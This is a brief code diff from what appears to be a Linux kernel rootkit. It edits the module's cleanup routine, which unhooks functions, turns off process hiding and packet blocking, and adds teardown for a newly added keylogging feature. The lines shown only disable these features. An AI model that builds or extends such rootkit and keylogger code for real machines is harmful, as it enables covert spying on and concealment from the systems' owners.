@@ -26,11 +26,14 @@ static void cleanup(void){
     fh_remove_hooks(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE); //cleanup the hooks and revert them
     cleanup_lists();
     misc_deregister(&controller); // deregister the device controller
-    if(hide_process_active == 1){
+    if(hide_process_active){
         switch_hide_process();
     }
-    if(packet_blocker == 1){
+    if(packet_blocker){
         switch_net_hook();
+    }
+    if(KEYLOG_ACTIVE){
+        switch_key_logging();
     }
 }
 
